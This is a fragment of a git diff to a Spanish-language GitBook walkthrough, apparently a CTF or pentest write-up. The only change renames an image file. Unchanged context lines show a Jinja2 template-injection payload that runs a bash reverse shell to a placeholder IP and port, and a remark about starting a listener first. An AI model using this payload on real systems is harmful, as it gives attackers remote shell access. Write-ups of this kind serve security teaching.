@@ -263,7 +263,7 @@ Vamos crearnos una `reverse shell` de la siguiente forma:
 {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read() }}
 ```
 
-<figure><img src="../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (180) (1).png" alt=""><figcaption></figcaption></figure>
 
 Antes de ejecutarlo nos pondremos a la escucha:
 
